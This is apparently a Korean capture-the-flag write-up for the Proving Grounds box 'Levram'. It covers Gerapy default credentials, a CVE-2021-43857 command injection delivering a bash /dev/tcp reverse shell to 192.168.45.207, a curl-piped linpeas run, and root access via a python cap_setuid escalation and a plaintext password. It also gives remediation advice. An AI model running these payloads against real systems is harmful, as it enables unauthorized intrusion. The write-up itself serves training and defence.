---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/cmd-injection
  - tech/lin/capabilities
  - tech/enum/peas
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.24
ports: [22, 8000]
services: [http, ssh]
cves: [CVE-2021-43857]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 192.168.248.24 · Ubuntu 22.04 · Fundamental(PG Practice — Pentester Foundations #3) · 플래그 2개
> 진입점: 8000 Gerapy 0.9.7 웹 UI 에 기본 자격증명 `admin:admin` 로그인 → `DEBUG=True` 404 덤프로 라우팅 확보 → `/api/project/<name>/parse` 의 `spider` 파라미터 명령주입(CVE-2021-43857) → `app` 셸
> 권한상승 2경로: `python3.10` 의 `cap_setuid` capability(GTFOBins, 반쪽 root) / `/etc/systemd/system/app.service` 주석의 평문 root 비밀번호(`su root`, 완전한 root)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.24

### Initial Access – Gerapy 기본 자격증명 로그인 후 spider 파라미터 명령주입으로 원격 코드 실행

**Vulnerability Explanation:** Gerapy(Scrapy 분산 크롤러 관리 UI, Django 기반) 0.9.7 인스턴스가 CVE-2021-43857 에 취약.
- 웹 관리 콘솔이 기본 자격증명 `admin:admin` 를 그대로 사용 — 인증 자체가 무방비
- `/api/project/<project_name>/parse` 뷰가 `json.loads(request.body)` 로 원시 바디를 직접 읽어 `spider` 파라미터를 검증 없이 `'gerapy parse {args_cmd} {project_path} {spider_name}'.format(...)` 문자열에 연결한 뒤 `Popen(cmd, shell=True, ...)` 로 실행 — 백틱/명령치환이 그대로 `/bin/sh` 에서 실행됨
- CVE-2021-43857(Gerapy < 0.9.8, 인증 후 원격 명령 실행)

**Vulnerability Fix:**
- 최초 기동 시 기본 계정 강제 변경, 또는 부팅 거부
- Gerapy 0.9.8 이상으로 업그레이드
- 근본 대책은 `shell=False` + 리스트 인자(`Popen(["gerapy","parse",project_path,spider])`) — 셸 파서를 아예 안 거치므로 메타문자가 그냥 문자열이 됨. 스파이더 이름은 화이트리스트로 검증
- 운영 환경에 개발 서버(`manage.py runserver`)를 노출하지 말 것 — gunicorn/uWSGI + nginx 뒤로
- `/api/user/auth` 에 DRF `throttling` 적용 — 기본 자격증명이 아니어도 인증 API 에 레이트리밋이 없었음
- 주석 처리된 권한 데코레이터(`views.py:33` `index`, `views.py:303` `project_upload`) 복원 — 비인증으로 열린 업로드 엔드포인트는 그 자체로 임의 파일 쓰기 후보

**Severity:** Critical — 기본 자격증명으로 인증 장벽이 사실상 없고, 인증 후 임의 명령 실행이 즉시 성립

**Steps to reproduce the attack:**
1. 8000/tcp Gerapy 배너(`WSGIServer`, Django) 확인 → 존재하지 않는 경로 요청으로 `DEBUG=True` 404 덤프에서 라우팅 테이블 획득
2. `POST /api/user/auth` 에 `{"username":"admin","password":"admin"}` → 인증 토큰 획득
3. `POST /api/project/<name>/parse` 에 `Authorization: Token <값>` 헤더와 `{"spider":"` 백틱으로 감싼 리버스셸 `"}` 페이로드 전송
4. Kali 리스너에 `app` 권한 리버스셸 수신

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.24 | TCP: 22, 8000 |

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.24
Nmap scan report for 192.168.248.24
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# Nmap done at Wed Aug 19 17:29:01 2026 -- 1 IP address (1 host up) scanned in 42.07 seconds
```
— 출처: `~/PG/Levram/nmap.log`(OS 지문 덤프·트레이스라우트 절제)

`WSGIServer 0.2` 는 Django 개발 서버(`manage.py runserver`) 배너 — 운영 환경에 개발 서버를 띄운 것이므로 `DEBUG = True` 가능성이 높음. `<title>Gerapy</title>` 로 제품 확정.

**열거 — `DEBUG=True` 가 라우팅 테이블을 덤프한다**

존재하지 않는 경로를 요청하면 Django 가 URLconf 전체를 404 페이지에 뱉는다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/nonexistent | grep -oE '\^api/[^<]*' | head
^api/project/(\S+)/parse
^api/project/create
^api/project/index
...
```
`[가정]` HTTP 응답 원문이 산출물로 남아 있지 않음 — `~/PG/Levram/` 에 회수된 것은 스캔 로그(`nmap.log`·`nmap.stdout`·`full_tcp.nmap`)와 스크립트(`50640.py`·`trigger.sh`·`run.sh`·`runf.sh`·`pathA*.txt`·`pathB.sh`)뿐이고 웹 응답 본문은 한 건도 없음. 이 절의 `curl` 블록 둘(위 404 덤프, 아래 트레일링 슬래시 확인)은 절차를 다시 밟으면 나오는 형태로 적은 재구성임. 값 자체는 1차 사료로 확인됨 — `^api/project/(\S+)/parse` 는 정품 gerapy 0.9.7 `urls.py` **31행**에 그대로 있음(`~/.cache/pip` 캐시 wheel 로 재확인).

이 덤프 하나로 디렉터리 브루트포싱이 통째로 생략된다 — Django/Flask 개발 서버 배너를 보면 아무 경로나 때려 스택트레이스/URLconf 부터 확인할 것([[_PLAYBOOK#B-1-41. 개발 서버 배너를 보면 dirbust 대신 «일부러 500»]]).

**버전 판정 — 독립 근거 2개**

CVE-2021-43857 은 0.9.8 에서 패치됨. 판정에 쓴 두 축:

*증거 A — 라이브 URLconf 의 트레일링 슬래시(서버측 런타임 동작).* Gerapy 는 0.9.8 에서 URL 패턴의 끝 슬래시를 제거했다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/zzz404 | grep -oE '\^api/(client|task|index/status)/?\$'
^api/index/status/$
^api/client/$
^api/task/$
```

PyPI 0.9.5~0.9.11 sdist 의 `urls.py` md5 대조:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ md5sum gerapy-0.9.*/gerapy/server/core/urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.5/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.6/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.7/.../urls.py   ← 슬래시 있음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.8/.../urls.py   ← 슬래시 없음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.9/.../urls.py
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.11/.../urls.py
```
— 출처: 릴리스 아카이브 대조. 0.9.5·0.9.6·0.9.7·0.9.8 네 행은 `~/.cache/pip` 캐시 wheel 의 `gerapy/server/core/urls.py` 로 재확인함(md5 그대로 일치). 0.9.9·0.9.11 은 캐시에 없어 재확인 불가 `[가정]` — 판정에는 영향이 없음(경계는 0.9.7↔0.9.8).

→ 후보 `{0.9.5, 0.9.6, 0.9.7}` — 셋 다 0.9.8 미만이므로 이 시점에 이미 취약 확정.

*증거 B(보조, A 와 독립) — webpack 자산 파일명 집합을 정품 wheel 과 대조.* Gerapy 는 콘텐츠 해시가 박힌 프런트엔드 번들(`app.[hash].js`)을 배포한다. 정품 0.9.7 wheel 의 js+css 자산(30개)과 타겟이 서빙한 자산 목록을 대조:

| 릴리스 | 0.9.7 자산 30개와 공통 | 메인 번들 |
|---|---|---|
| 0.9.5 / 0.9.6 | 0 / 30 | `app.747409e0.js` |
| **0.9.7** | **30 / 30** | `app.21167fa2.js` |
| 0.9.8 | 7 / 30 | `app.6999e9f7.js` |

타겟 서빙 번들(`app.21167fa2.js`)이 0.9.7 정품과 파일명 일치. 다만 크기·문자열은 어긋남:

| | 크기 | `Gerapy v0.9.7` 문자열 | 푸터 |
|---|---|---|---|
| 정품 0.9.7 wheel | 26533 | 0건 | `Gerapy All Rights Reserved.` |
| 타겟 서빙본 | 26541(+8) | 1건 | `Gerapy v0.9.7 All Rights Reserved.` |

**푸터의 `Gerapy v0.9.7` 문자열은 정품 산출물이 아니라 출제자가 삽입한 것**(`lang:"zh"`→`"en"` 편집도 함께 확인) — 판정에는 세지 않은 근거(증거 C, 위조 비용 0)였는데 이 박스에서는 그 값이 실제로도 맞았을 뿐이다. 정품 wheel 대조본은 `~/PG/`·`/tmp/gv/` 에는 남아 있지 않지만 `pip` 의 HTTP 캐시(`~/.cache/pip/http-v2/…/*.body`)에서 재확보해 재대조함 — sdist(`--no-binary :all:`)에는 빌드된 `app.*.js` 가 아예 없으므로 wheel 로 받아야 이 축이 성립한다. 방법론과 판정 원칙은 [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]].

**인증**

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/user/auth \
     -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}'
{"token":"710dcf5387645f05a0484347be4a8509ea749008"}
```
— 출처: 요청 형태는 `~/PG/Levram/trigger.sh` 의 토큰 획득 구간과 동일(그쪽은 응답을 `python3 -c 'json.load(...)["token"]'` 로 파싱). 응답 본문 파일은 미보존이라 위 JSON 한 줄은 토큰 값만 확정된 재구성임 `[가정]`.

`admin:admin` 성립. 이후 모든 요청에 `Authorization: Token <값>` 을 붙인다 — DRF `TokenAuthentication` 은 `Bearer` 가 아니라 `Token` 스킴이다.

| 프레임워크 | 헤더 |
|---|---|
| DRF `TokenAuthentication` | `Authorization: Token <키>` |
| JWT / 대부분의 OAuth2 | `Authorization: Bearer <키>` |

`views.py` grep 으로 권한 데코레이터가 주석 처리된 곳 2개를 확인 — `index`(33행)·`project_upload`(303행)가 비인증으로 열려 있음. 실제 익스플로잇에는 쓰지 않았고, "비인증은 `/api/user/auth` 하나뿐"이라는 단정이 응답 관측만으로는 성립하지 않는다는 근거로만 남긴다.

### Initial Access – Gerapy spider 파라미터 명령주입으로 app 셸 획득

`searchsploit -m 50640` 으로 받은 공개 PoC(EDB 50640)는 로컬에서 `dict3[0]['name']` 을 읽다 프로젝트가 0개인 이 박스에서 `IndexError` 로 죽는다 — 타겟에 요청조차 가지 않는다. 예외가 파이썬 로컬 트레이스백이라는 것 자체가 "타겟이 아니라 스크립트가 문제"라는 진단이다. 취약 코드(`views.py:502-541`)는 프로젝트 디렉터리 존재를 검사하지 않으므로 주입 자체에는 선행조건이 없다 — 스크립트의 한계를 취약점의 전제조건으로 옮기지 않는다(시행착오 상세는 [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]]). 이 박스는 수동 `curl` 로 직접 진행했다.

페이로드:
```json
{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'`"}
```
- 백틱 — 명령 치환. 값이 놓일 자리를 유지한 채 안쪽만 실행
- `/bin/bash -c '...'` — `Popen(cmd, shell=True)` 는 `/bin/sh` 를 쓰고 Ubuntu 의 `/bin/sh` 는 dash. `>&`·`0>&1`·`/dev/tcp` 는 bash 전용이라 이 층을 빼면 dash 가 **파싱 단계에서** 죽음 — `/dev/tcp` 에 도달조차 못 함([[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]])
  ```text
  dash: 1: Syntax error: Bad fd number
  ```
  — 출처: Kali 에서 `dash -c 'bash -i >& /dev/tcp/127.0.0.1/1/ 0>&1'` 직접 실행(exit 2). 이 박스의 타겟 출력이 아니라 동작 확인용 재현임
  ⚠️ **이 실패는 조용하지 않음.** `project_parse` 는 `stderr` 를 그대로 `JsonResponse({'status': False, 'message': stderr})` 로 돌려주므로 위 문법오류가 **HTTP 응답 본문에 실려 온다** — 「응답이 비었다」가 아니라 「응답에 dash 에러가 찍혔다」가 이 층을 빠뜨렸을 때의 증상임
- `bash -i` — 대화형 셸. `>& /dev/tcp/.../4444 0>&1` — stdout/stderr/stdin 을 TCP 소켓에 리다이렉트(bash 전용 가상 경로)

리스너를 먼저 띄우고 주입:
```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ tmux new-session -d -s levram 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/pwn/parse \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'"'"'`"}'
```
— 출처: `~/PG/Levram/trigger.sh`(변수 `$TARGET`·`$LHOST`·`$LPORT` 를 실제 값으로 펼친 것. 원본은 `timeout 15` 를 붙여 실행함)

`spider` 는 명령 문자열의 맨 끝 토큰이라 `;`·`&&` 도 통했겠으나, 백틱은 EDB 50640 원문을 그대로 따른 것이다. 인용이 5중으로 중첩되므로(로컬 bash → JSON → 원격 sh → bash -c) 손으로 따옴표를 셀 자리가 아니면 base64 래핑으로 우회한다([[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]).

```text
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.24] 46158
bash: cannot set terminal process group (846): Inappropriate ioctl for device
app@ubuntu:~/gerapy$ id
uid=1000(app) gid=1000(app) groups=1000(app)
```
`cannot set terminal process group` 은 에러가 아니다 — 제어 TTY 가 없어 `bash -i` 의 잡 제어 설정이 실패한 것뿐, 셸은 정상 동작한다.

TTY 업그레이드:
```text
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z ; stty raw -echo; fg ; Enter ; export TERM=xterm
```

```bash
app@ubuntu:~$ cat /home/app/local.txt
367447fc2401d598d4368ed12eb7ca2d
```

**Local.txt value:**
`367447fc2401d598d4368ed12eb7ca2d`

### Privilege Escalation – Linux capability(`cap_setuid`, GTFOBins)

**Vulnerability Explanation:** `linpeas.sh` 로 `/usr/bin/python3.10` 에 `cap_setuid=ep` capability 가 부여돼 있음을 발견. `CAP_SETUID` 는 `setuid()`/`setreuid()`/`setresuid()`/`setfsuid()` 로 임의 UID 전환을 허용하는 권한이며, `=ep` 표기는 실행 즉시(effective) 활성 상태로 시작함을 뜻한다. 인터프리터에 이 capability 가 붙으면 사용자가 준 임의 코드가 그 권한으로 돈다 — 조각난 권한이 아니라 범용 권한 부여와 같다.

**Vulnerability Fix:** `setcap -r /usr/bin/python3.10` 로 제거. 특정 권한이 필요하면 전용 최소 헬퍼 바이너리에만 부여하고 범용 인터프리터에는 절대 붙이지 않는다. 서비스 유닛(`app.service`)에 `NoNewPrivileges=yes` 를 걸면 이 경로(capability 기반 권한상승) 자체가 차단된다 — capability 상속이 서비스 프로세스 트리 아래로 전파되지 않게 막는 systemd 옵션.

**Severity:** Critical — 별도 인증 없이 즉시 UID 0 전환. 다만 `CAP_SETGID` 는 부여되지 않아 `gid`/`groups` 는 `app` 로 남는 반쪽 컨텍스트

**Steps to reproduce the attack:**
1. 셸 획득 직후 `linpeas.sh` 업로드·실행(시험 허용 도구 — 수동 대안은 `getcap -r / 2>/dev/null`)
2. `Capabilities` 섹션에서 `/usr/bin/python3.10 cap_setuid=ep` 확인
3. GTFOBins `cap_setuid` 항목대로 `os.setuid(0)` 호출

linpeas 를 Kali 웹서버에서 내려받아 파이프로 실행. 열거 결과 중 `Capabilities` 섹션이 `/usr/bin/python3.10` 을 강조해 뱉음.

```bash
app@ubuntu:~$ curl -s http://192.168.45.207/linpeas.sh | sh

app@ubuntu:~$ /usr/bin/python3.10 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@ubuntu:~/gerapy# id
uid=0(root) gid=1000(app) groups=1000(app)
```
`[가정]` 위 `curl … | sh` 한 줄은 재구성임 — 이 세션의 `~/PG/Levram/` 에 linpeas 바이너리도 실행 로그도 회수돼 있지 않음. linpeas 로 이 capability 를 찾았다는 사실 자체는 **이전 세션(부록 A, 다른 랩 인스턴스)의 스크린샷으로 확정**되고, 아래 `python3.10` 실행과 `id` 출력은 이 세션의 재현 스크립트(`~/PG/Levram/pathA.txt`·`pathA3.txt`)와 일치함.

linpeas 의 `Files with capabilities` 출력(이전 세션 캡처):

![[Pasted image 20260629102405.png]]

GTFOBins 원문은 `setuid` 만 호출함 — `os.setgid(0)` 을 덧붙이면 `EPERM` 으로 실패함. capability 는 정확히 부여된 것만 쓸 수 있고, 원문의 최소성이 곧 그 capability 의 정확한 최대치임. 실제로 이 박스에서 `setgid` 를 얹은 판(`~/PG/Levram/pathA2.txt`)과 GTFOBins 원문판(`pathA3.txt`)이 나란히 남아 있고, 살아남은 것은 후자임.

**노이즈와 후보를 가르는 기준은 이 박스에서 실측으로 나왔다.** 위 캡처의 6행 중 5행이 정상 항목이다.

| 캡처에 찍힌 것 | 판정 |
|---|---|
| `/snap/core20/1518/usr/bin/ping`·`/snap/core20/1891/usr/bin/ping`·`/usr/bin/ping` — `cap_net_raw=ep` | 노이즈 |
| `/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper` — `cap_net_bind_service,cap_net_admin=ep` | 노이즈 |
| `/usr/bin/mtr-packet` — `cap_net_raw=ep` | 노이즈 |
| `/usr/bin/python3.10` — `cap_setuid=ep` | **후보** |

외울 규칙 둘 — `cap_net_*` 는 거의 항상 노이즈. 대상이 인터프리터·아카이버·디버거(`python`·`perl`·`tar`·`gdb` 등)면 후보로 본다. `[가정]` 위 「노이즈」 판정 자체(그 5행이 Ubuntu 22.04 패키지 기본값이라는 것)는 배포판 일반 지식이고, 캡처가 확정하는 것은 「이 호스트의 capability 보유 파일 전량이 저 6행」까지다.

### Privilege Escalation – systemd 유닛 파일 주석의 평문 root 비밀번호

**Vulnerability Explanation:** `/etc/systemd/system/*.service` 는 기본이 world-readable. `app.service` 유닛 파일 주석에 root 비밀번호가 평문으로 남아 있었음 — 관리자가 배포·운영 메모를 지우지 않은 흔적.

**Vulnerability Fix:** 즉시 비밀번호 회전 및 주석 삭제. 자격증명은 `EnvironmentFile=`(권한 0600, root 전용) 또는 `systemd-creds`/전용 시크릿 매니저로 분리. 유닛 파일 자체도 자격증명을 담는다면 `chmod 600`.

**Severity:** Critical — 로컬 저장 평문 자격증명으로 완전한 root 컨텍스트 즉시 획득

**Steps to reproduce the attack:**
1. `cat /etc/systemd/system/*.service` (world-readable 기본값 활용)
2. 주석에서 평문 root 비밀번호 확인
3. `su root` 로 인증 → 완전한 root(`uid=0 gid=0 groups=0`)

```bash
app@ubuntu:~$ cat /etc/systemd/system/app.service
[Unit]
Description=Gerapy app service

# root:4!m?C%7k@Xb?XNH0!>6K          ← 주석에 root 비밀번호

[Service]
User=app
Type=simple
ExecStart=/bin/bash /home/app/run.sh

[Install]
WantedBy=multi-user.target
```
— 출처: 이 유닛 파일에서 주운 비밀번호가 `~/PG/Levram/pathB.sh` 의 `PW='4!m?C%7k@Xb?XNH0!>6K'` 로 그대로 박혀 있음. `ExecStart` 가 가리키는 `/home/app/run.sh` 는 타겟 쪽 파일이라 Kali 의 동명 스크립트(`~/PG/Levram/run.sh`, tmux 헬퍼)와 무관함

```bash
app@ubuntu:~$ su root
Password:
root@ubuntu:/home/app/gerapy# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/app/gerapy# cat /root/proof.txt
aaa7973d6eecab6c5268390c53579801
```
— 출처: 이 순서를 그대로 실행한 재현 스크립트가 `~/PG/Levram/pathB.sh`(`su root` → 비밀번호 전송 → `id; echo PATH_B_ROOT_OK; cat /root/proof.txt`). 화면은 `tmux capture-pane` 으로 회수함

`Password:` 뒤가 빈 것은 pty 가 붙은 세션의 정상 동작임 — `su` 가 stdin 을 noecho 로 바꾸기 때문. **이 박스는 pty 쪽이 맞다** — 리버스셸을 `pty.spawn` 으로 승격한 뒤 tmux 페인에서 진행했고(`pathB.sh` 가 그 페인에 `send-keys` 로 비밀번호를 밀어 넣음), 따라서 에코가 남지 않는 것이 정상임. pty 유무에 따른 에코 판별과 `su` 가 TTY 를 요구하지 않는다는 실측은 [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]].

`[가정]` 같은 비밀번호로 SSH 직접 로그인은 시도하지 않았다. Ubuntu 22.04 sshd 기본값 `PermitRootLogin prohibit-password` 이면 비밀번호 로그인 자체가 안 되므로, 확인 없이 "SSH 재접속 채널 확보"라고 단정하지 않는다.

두 경로 중 B(systemd)가 완전한 root 컨텍스트를 주므로 `proof.txt` 는 B 경로에서 읽었다. A(capability)는 `gid=1000(app)` 이 남는 반쪽이지만 `proof.txt` 읽기에는 지장이 없다 — 시험에서 경로가 둘이면 재접속 비용(자격증명 확보 여부)으로 고른다.

### Post-Exploitation

**Proof.txt value:**
`aaa7973d6eecab6c5268390c53579801`

**남긴 흔적**
- 서버 파일시스템에 **새로 만든 것은 없음.** `project_parse` 는 `join(PROJECTS_FOLDER, project_name)` 로 경로 문자열을 조립할 뿐 디렉터리를 만들지 않고, 실제로 쏜 `~/PG/Levram/trigger.sh` 는 `/api/project/create` 를 호출하지 않고 곧바로 `/api/project/pwn/parse` 를 때림 — `pwn` 은 존재하지 않아도 되는 **임의 경로 세그먼트**임. `[가정]` 옛 판본은 「프로젝트 `pwn` 생성됨」으로 적었으나 그 요청의 산출물이 없고 트리거 스크립트와도 어긋남. 만약 생성됐다면 정리는 `POST /api/project/pwn/remove`, 어차피 랩 Stop/Revert 시 소멸
- 계정 생성·설정 변경 없음
- Kali 쪽 tmux 세션(`levram`) 이름으로 종료, 리스너 정리 확인

## 부록 A — 이전 세션 기록 (2026-06-26, 다른 랩 인스턴스)

> [!note] 이 절은 원본 노트의 보존본이다 — 본문과 다른 랩 인스턴스다
> 이 박스를 2026-06-26에 한 번 풀었던 기록이다. 타겟 IP가 본문(`192.168.248.24`)과 다르다 — 이 절의 nmap은 `192.168.161.24`, 리버스셸 로그는 `192.168.132.24` 로 또 다르다(같은 날 랩이 재기동된 것으로 보인다).
> 프론트매터의 `ip:` 가 한때 `192.168.161.24` 로 잘못 박혀 있었다 — 색인 스크립트가 부록의 IP를 본문 값으로 집어간 것이다. 지금은 `192.168.248.24` 로 정정했다.
> 플래그 값도 본문과 다르다(`local.txt` `6fb5bd58…` / `proof.txt` `ed363800…`). 인스턴스마다 재생성되기 때문이고, 본문(최신 세션)의 값이 최신이다.
> 같은 박스를 다른 시점에 두 번 푼 기록이라 대조 자료로 가치가 있다 — 랩 인스턴스마다 무엇이 바뀌고 무엇이 그대로인지 확인할 수 있다.

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ nnmap 192.168.161.24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 14:13 +0900
Nmap scan report for 192.168.161.24
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   65.47 ms 192.168.45.1
2   65.43 ms 192.168.45.254
3   65.53 ms 192.168.251.1
4   65.62 ms 192.168.161.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
```

8000 포트 접근 후 로그인 시도`admin/admin`
![[Pasted image 20260626142047.png]]

로그인 성공 후 gerapy v0.9.7 확인
![[Pasted image 20260629092125.png]]

CVE 검색
![[Pasted image 20260629092156.png]]

RCE 취약점 발견 

![[Pasted image 20260629092221.png]]

payload 검색
![[Pasted image 20260629092234.png]]


payload 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ git clone https://github.com/LongWayHomie/CVE-2021-43857.git
Cloning into 'CVE-2021-43857'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 124.07 KiB | 20.68 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```
![[Pasted image 20260629092306.png]]


payload 실행 후 `app` 계정 접근
```bash
┌──(kali㉿kali)-[~/PG/Levram/CVE-2021-43857]
└─$ python cve-2021-43857.py -t 192.168.132.24 -p 8000 -L 192.168.45.156 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/


Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: 4leaf
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.24] 53596
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ whoami
whoami
app
app@ubuntu:~/gerapy$
```

local.txt 획득
```bash
app@ubuntu:~$ cat local.txt
cat local.txt
6fb5bd58ccdadc78eb9299e4a6dccc25
app@ubuntu:~$ ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.132.24  netmask 255.255.255.0  broadcast 192.168.132.255
        ether 00:50:56:ab:d2:c7  txqueuelen 1000  (Ethernet)
        RX packets 1541  bytes 153139 (153.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1282  bytes 3613201 (3.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 392  bytes 31600 (31.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 392  bytes 31600 (31.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![[Pasted image 20260629092633.png]]


linpeas.sh 실행하여 python 취약점 발견
![[Pasted image 20260629102405.png]]


root 획득 후 flag 확인

```bash
app@ubuntu:~/gerapy$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ubuntu:~/gerapy# whoami
whoami
root
root@ubuntu:~/gerapy# cat /root/proof.txt
cat /root/proof.txt
ed363800340058da6500e35c1150c446
```
![[Pasted image 20260629102311.png]]

---

## 관련

- CVE-2021-43857 — Gerapy < 0.9.8 인증 후 원격 명령 실행(`/api/project/<name>/parse` 의 `spider`). https://nvd.nist.gov/vuln/detail/CVE-2021-43857 · GitHub Advisory `GHSA-cpwx-vrp4-4pq7`
- Exploit-DB 50640 — Gerapy 0.9.7 RCE PoC. 프로젝트가 최소 1개 존재해야 로컬에서 안 죽음(`searchsploit -m 50640`)
- GTFOBins — Capabilities / python: https://gtfobins.github.io/gtfobins/python/#capabilities
- Django `DEBUG` 설정: https://docs.djangoproject.com/en/4.2/ref/settings/#debug
- DRF `TokenAuthentication`: https://www.django-rest-framework.org/api-guide/authentication/#tokenauthentication
- [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]] · [[_PLAYBOOK#B-1-41. 개발 서버 배너를 보면 dirbust 대신 «일부러 500»]] · [[_PLAYBOOK#B-6-12. 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다]]
- [[Hub]] — 버전 판정을 같은 출처 근거 3개로 하다 틀린 사례. 독립 근거 2개 방법론의 배경
- [[RubyDome]] · [[Astronaut]] · [[Squid]] — 같은 "버전 판정은 독립 근거 2개" 패턴
